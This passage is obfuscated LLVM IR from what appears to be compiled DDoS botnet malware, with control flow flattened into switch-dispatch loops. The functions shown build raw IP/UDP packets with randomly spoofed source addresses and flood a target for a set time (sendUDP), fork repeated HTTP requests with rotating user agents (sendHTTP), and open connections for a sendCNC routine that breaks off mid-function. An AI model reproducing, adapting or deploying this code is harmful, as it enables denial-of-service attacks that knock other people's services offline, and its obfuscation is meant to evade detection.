  %.reload20 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload20, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 2
  store i8 0, i8* %1106, align 8
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %.reload19 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload19, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1109, i32 0, i32 3
  store i8 1, i8* %1110, align 1
  store i32 -1305401158, i32* %switchVar
  br label %loopEnd

; <label>:1111:                                   ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:1112:                                   ; preds = %loopEntry
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:1113:                                   ; preds = %loopEntry
  %1114 = load i32, i32* %2, align 4
  %1115 = add nsw i32 %1114, 1
  store i32 %1115, i32* %2, align 4
  store i32 -1990651907, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  store i32 -697128831, i32* %switchVar
  br label %loopEnd

; <label>:1117:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %1116, %1113, %1112, %NewDefault, %1111, %1070, %1034, %1014, %1002, %996, %988, %983, %968, %959, %958, %943, %933, %921, %915, %910, %890, %881, %861, %844, %824, %818, %810, %805, %790, %781, %766, %740, %739, %724, %714, %702, %687, %678, %672, %667, %662, %619, %599, %593, %585, %580, %565, %556, %541, %515, %514, %499, %489, %477, %459, %439, %434, %425, %419, %411, %410, %395, %385, %384, %369, %365, %364, %333, %318, %307, %275, %274, %265, %264, %258, %250, %249, %240, %229, %224, %201, %200, %161, %160, %155, %146, %135, %120, %100, %87, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %70, %65, %64, %63, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1090421598, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1090421598, label %first
    i32 -1356215179, label %28
    i32 1133976808, label %32
    i32 -1256936079, label %37
    i32 -960269746, label %43
    i32 -544716690, label %44
    i32 1137510375, label %52
    i32 -1235933419, label %53
    i32 1167813439, label %59
    i32 1105790276, label %60
    i32 2092889369, label %61
    i32 -442059722, label %66
    i32 -446258367, label %71
    i32 1829421118, label %116
    i32 -623704297, label %118
    i32 -83578704, label %123
    i32 -82272097, label %148
    i32 -347025627, label %149
    i32 656930091, label %162
    i32 -233843037, label %164
    i32 -1080662594, label %169
    i32 -1737379237, label %196
    i32 -1825077762, label %201
    i32 -1778237109, label %202
    i32 1075280961, label %203
    i32 1591528281, label %206
    i32 117915892, label %208
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 -1356215179, i32 1133976808
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 -1256936079, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 -1256936079, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -960269746, i32 -544716690
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 117915892, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %11, align 4
  store i32 %47, i32* %14, align 4
  %48 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -1235933419, i32 1137510375
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 117915892, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #2
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 1167813439, i32 1105790276
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 117915892, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 50, i32* %17, align 4
  store i32 2092889369, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %17, align 4
  %64 = icmp ne i32 %62, 0
  %65 = select i1 %64, i32 -442059722, i32 -446258367
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %67, %68
  call void @srand(i32 %69) #2
  %70 = call i32 @rand() #2
  call void @init_rand(i32 %70)
  store i32 2092889369, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %12, align 4
  %73 = sub nsw i32 32, %72
  %74 = shl i32 1, %73
  %75 = sub nsw i32 %74, 1
  %76 = xor i32 %75, -1
  store i32 %76, i32* %18, align 4
  %77 = load i32, i32* %10, align 4
  %78 = sext i32 %77 to i64
  %79 = add i64 28, %78
  store i64 %79, i64* %.reg2mem2
  %80 = call i8* @llvm.stacksave()
  store i8* %80, i8** %19, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %81 = alloca i8, i64 %.reload4, align 16
  store i8* %81, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %82 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %82, %struct.iphdr** %20, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %84 = bitcast %struct.iphdr* %83 to i8*
  %85 = getelementptr i8, i8* %84, i64 20
  %86 = bitcast i8* %85 to %struct.udphdr*
  store %struct.udphdr* %86, %struct.udphdr** %21, align 8
  %87 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %89 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 4
  %91 = load i32, i32* %18, align 4
  %92 = call i32 @getRandomIP(i32 %91)
  %93 = call i32 @htonl(i32 %92) #13
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = add i64 8, %95
  %97 = trunc i64 %96 to i32
  call void @makeIPPacket(%struct.iphdr* %87, i32 %90, i32 %93, i8 zeroext 17, i32 %97)
  %98 = load i32, i32* %10, align 4
  %99 = sext i32 %98 to i64
  %100 = add i64 8, %99
  %101 = trunc i64 %100 to i16
  %102 = call zeroext i16 @htons(i16 zeroext %101) #13
  %103 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %104 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %103, i32 0, i32 0
  %105 = bitcast %union.anon.2* %104 to %struct.anon.3*
  %106 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %105, i32 0, i32 2
  store i16 %102, i16* %106, align 2
  %107 = call i32 @rand_cmwc()
  %108 = trunc i32 %107 to i16
  %109 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %110 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.2* %110 to %struct.anon.3*
  %112 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %111, i32 0, i32 0
  store i16 %108, i16* %112, align 2
  %113 = load i32, i32* %8, align 4
  %114 = icmp eq i32 %113, 0
  %115 = select i1 %114, i32 1829421118, i32 -623704297
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call i32 @rand_cmwc()
  store i32 -83578704, i32* %switchVar
  store i32 %117, i32* %.reg2mem10
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %8, align 4
  %120 = trunc i32 %119 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #13
  %122 = zext i16 %121 to i32
  store i32 -83578704, i32* %switchVar
  store i32 %122, i32* %.reg2mem10
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %124 = trunc i32 %.reload11 to i16
  %125 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %126 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon.2* %126 to %struct.anon.3*
  %128 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %127, i32 0, i32 1
  store i16 %124, i16* %128, align 2
  %129 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %130 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.2* %130 to %struct.anon.3*
  %132 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %131, i32 0, i32 3
  store i16 0, i16* %132, align 2
  %133 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %134 = bitcast %struct.udphdr* %133 to i8*
  %135 = getelementptr inbounds i8, i8* %134, i64 8
  %136 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %135, i32 %136)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %137 = bitcast i8* %.reload8 to i16*
  %138 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 2
  %140 = load i16, i16* %139, align 2
  %141 = zext i16 %140 to i32
  %142 = call zeroext i16 @csum(i16* %137, i32 %141)
  %143 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 7
  store i16 %142, i16* %144, align 2
  %145 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %146 = load i32, i32* %9, align 4
  %147 = add nsw i32 %145, %146
  store i32 %147, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -82272097, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 -347025627, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %15, align 4
  %151 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %152 = call i64 @sendto(i32 %150, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %151, i32 16)
  %153 = call i32 @rand_cmwc()
  %154 = trunc i32 %153 to i16
  %155 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %156 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon.2* %156 to %struct.anon.3*
  %158 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %157, i32 0, i32 0
  store i16 %154, i16* %158, align 2
  %159 = load i32, i32* %8, align 4
  %160 = icmp eq i32 %159, 0
  %161 = select i1 %160, i32 656930091, i32 -233843037
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = call i32 @rand_cmwc()
  store i32 -1080662594, i32* %switchVar
  store i32 %163, i32* %.reg2mem12
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32, i32* %8, align 4
  %166 = trunc i32 %165 to i16
  %167 = call zeroext i16 @htons(i16 zeroext %166) #13
  %168 = zext i16 %167 to i32
  store i32 -1080662594, i32* %switchVar
  store i32 %168, i32* %.reg2mem12
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %170 = trunc i32 %.reload13 to i16
  %171 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon.2* %172 to %struct.anon.3*
  %174 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %173, i32 0, i32 1
  store i16 %170, i16* %174, align 2
  %175 = call i32 @rand_cmwc()
  %176 = trunc i32 %175 to i16
  %177 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i32, i32* %18, align 4
  %180 = call i32 @getRandomIP(i32 %179)
  %181 = call i32 @htonl(i32 %180) #13
  %182 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %184 = bitcast i8* %.reload6 to i16*
  %185 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  %187 = load i16, i16* %186, align 2
  %188 = zext i16 %187 to i32
  %189 = call zeroext i16 @csum(i16* %184, i32 %188)
  %190 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 7
  store i16 %189, i16* %191, align 2
  %192 = load i32, i32* %23, align 4
  %193 = load i32, i32* %14, align 4
  %194 = icmp eq i32 %192, %193
  %195 = select i1 %194, i32 -1737379237, i32 1075280961
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %198 = load i32, i32* %22, align 4
  %199 = icmp sgt i32 %197, %198
  %200 = select i1 %199, i32 -1825077762, i32 -1778237109
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  store i32 1591528281, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 -82272097, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %23, align 4
  %205 = add i32 %204, 1
  store i32 %205, i32* %23, align 4
  store i32 -82272097, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %207)
  store i32 117915892, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %206, %203, %202, %201, %196, %169, %164, %162, %149, %148, %123, %118, %116, %71, %66, %61, %60, %59, %53, %52, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1581446239, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1581446239, label %first
    i32 1351288337, label %14
    i32 818033256, label %15
    i32 976702688, label %38
    i32 507745049, label %39
    i32 -1135574099, label %45
    i32 1059587271, label %46
    i32 402437613, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 1351288337, i32 818033256
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 402437613, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #2
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #13
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #2
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 976702688, i32 507745049
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 402437613, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -1135574099, i32 1059587271
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 402437613, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 402437613, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = add nsw i32 %19, %20
  store i32 %21, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -759978778, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -759978778, label %22
    i32 393379566, label %27
    i32 943894101, label %41
    i32 1982061357, label %42
    i32 -766311424, label %47
    i32 114613526, label %54
    i32 -888684142, label %65
    i32 163036573, label %66
    i32 1546857204, label %67
    i32 -1828558356, label %68
    i32 896539172, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %14, align 4
  %24 = load i32, i32* %12, align 4
  %25 = icmp slt i32 %23, %24
  %26 = select i1 %25, i32 393379566, i32 896539172
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %29 = load i8*, i8** %7, align 8
  %30 = load i8*, i8** %10, align 8
  %31 = load i8*, i8** %8, align 8
  %32 = call i32 @rand() #2
  %33 = srem i32 %32, 36
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i32 0, i32 0), i8* %29, i8* %30, i8* %31, i8* %36) #2
  %38 = call i32 @fork() #2
  %39 = icmp ne i32 %38, 0
  %40 = select i1 %39, i32 943894101, i32 1546857204
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  store i32 1982061357, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %15, align 4
  %44 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %45 = icmp sgt i32 %43, %44
  %46 = select i1 %45, i32 -766311424, i32 163036573
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 114613526, i32 -888684142
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %13, align 4
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = call i64 @strlen(i8* %57) #10
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %62 = call i64 @read(i32 %60, i8* %61, i64 1)
  %63 = load i32, i32* %13, align 4
  %64 = call i32 @close(i32 %63)
  store i32 -888684142, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 1982061357, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1828558356, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %14, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %14, align 4
  store i32 -759978778, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %65, %54, %47, %42, %41, %27, %22, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #13
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %switchVar = alloca i32
  store i32 1842248452, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1842248452, label %22
    i32 -1334229029, label %27
    i32 -494229064, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %7, align 4
